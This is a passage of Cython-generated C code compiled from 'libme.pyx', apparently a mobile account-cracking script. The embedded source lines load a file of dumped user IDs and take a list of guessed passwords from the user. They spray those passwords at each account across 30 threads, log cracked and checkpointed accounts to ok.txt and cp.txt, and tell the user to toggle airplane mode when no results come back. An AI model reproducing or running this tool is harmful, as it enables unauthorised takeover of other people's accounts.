      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 665, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
        __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
        __pyx_t_8 = NULL;
      } else {
        __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 665, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 665, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      for (;;) {
        if (likely(!__pyx_t_8)) {
          if (likely(PyList_CheckExact(__pyx_t_5))) {
            if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 665, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 665, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          } else {
            if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 665, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 665, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          }
        } else {
          __pyx_t_4 = __pyx_t_8(__pyx_t_5);
          if (unlikely(!__pyx_t_4)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 665, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_4);
        }
        __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":666
 * 			file = '/storage/emulated/0/100.txt'
 * 			for line in open(file, 'r').readlines():
 * 				self.id.append(line.strip())             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s "%(file))
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 666, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 666, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 666, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_11 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_t_6); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 666, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "libme.pyx":665
 * 		try:
 * 			file = '/storage/emulated/0/100.txt'
 * 			for line in open(file, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      }
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "libme.pyx":663
 * 		print("  [] Extra Dump Files Saved In > %s"%(__file))
 * 	def __10000__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			file = '/storage/emulated/0/100.txt'
 * 			for line in open(file, 'r').readlines():
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":667
 * 			for line in open(file, 'r').readlines():
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("\n [!] Please Dump File first %s "%(file))
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__10000__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 667, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":668
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s "%(file))             # <<<<<<<<<<<<<<
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 */
      if (unlikely(!__pyx_v_file)) { __Pyx_RaiseUnboundLocalError("file"); __PYX_ERR(0, 668, __pyx_L5_except_error) }
      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Please_Dump_File_first_s, __pyx_v_file); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 668, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 668, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":663
 * 		print("  [] Extra Dump Files Saved In > %s"%(__file))
 * 	def __10000__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			file = '/storage/emulated/0/100.txt'
 * 			for line in open(file, 'r').readlines():
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":669
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s "%(file))
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))             # <<<<<<<<<<<<<<
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 */
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_91m_s_0_97m_3, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":670
 * 			exit("\n [!] Please Dump File first %s "%(file))
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 670, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_v_ask = __pyx_t_6;
  __pyx_t_6 = 0;

  /* "libme.pyx":671
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 */
  __pyx_t_13 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_y, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 671, __pyx_L1_error)
  if (__pyx_t_13) {

    /* "libme.pyx":672
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 672, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 672, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 672, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_empty_tuple, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 672, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 672, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 672, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 672, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __pyx_t_4;
      __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_1, &__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_14);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_6;
            __pyx_t_6 = 0;

            /* "libme.pyx":673
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_Example_Separators_44) < 0) __PYX_ERR(0, 673, __pyx_L18_error)

            /* "libme.pyx":674
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 */
            __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 674, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_v_listpass = __pyx_t_6;
            __pyx_t_6 = 0;

            /* "libme.pyx":675
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            __pyx_t_7 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 675, __pyx_L18_error)
            __pyx_t_13 = ((__pyx_t_7 <= 5) != 0);
            if (__pyx_t_13) {

              /* "libme.pyx":676
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
              __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 676, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":675
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            }

            /* "libme.pyx":677
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
            __pyx_t_6 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 677, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 677, __pyx_L18_error)
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "libme.pyx":678
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 678, __pyx_L18_error)

            /* "libme.pyx":679
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 679, __pyx_L18_error)

            /* "libme.pyx":680
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 680, __pyx_L18_error)

            /* "libme.pyx":681
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 */
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 681, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            if (likely(PyList_CheckExact(__pyx_t_6)) || PyTuple_CheckExact(__pyx_t_6)) {
              __pyx_t_5 = __pyx_t_6; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 681, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 681, __pyx_L18_error)
            }
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_6 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_6); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 681, __pyx_L18_error)
                  #else
                  __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 681, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_6 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_6); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 681, __pyx_L18_error)
                  #else
                  __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 681, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  #endif
                }
              } else {
                __pyx_t_6 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_6)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 681, __pyx_L18_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_6);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_6);
              __pyx_t_6 = 0;

              /* "libme.pyx":682
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 * 					uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":
 */
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 682, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_10 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_4, function);
                }
              }
              __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_10, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 682, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_6))) || (PyList_CheckExact(__pyx_t_6))) {
                PyObject* sequence = __pyx_t_6;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 682, __pyx_L18_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_4 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_4 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_10);
                #else
                __pyx_t_4 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 682, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_10 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 682, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_10);
                #endif
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_6); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 682, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_4 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_4)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_4);
                index = 1; __pyx_t_10 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_10)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_10);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 682, __pyx_L18_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L28_unpacking_done;
                __pyx_L27_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 682, __pyx_L18_error)
                __pyx_L28_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_4);
              __pyx_t_4 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":683
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))             # <<<<<<<<<<<<<<
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 683, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_file); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 683, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 683, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_16);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_16, function);
                }
              }
              __pyx_t_9 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_17, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_kp_s__12);
